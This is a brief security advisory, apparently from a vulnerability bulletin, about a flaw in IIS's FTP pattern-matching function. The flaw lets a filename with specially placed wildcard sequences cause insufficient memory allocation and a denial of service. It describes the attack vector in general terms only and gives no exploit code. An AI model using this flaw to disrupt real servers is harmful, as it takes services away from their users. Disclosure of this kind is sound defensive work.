Due to a flaw in the pattern-matching function used by FTP commands, denial of service attacks can be successfully launched. If a user submits an FTP command along with a filename containing specially placed wildcard sequences, the pattern-matching function will not allocate sufficent memory. Resulting in IIS experiencing denial of service condition.
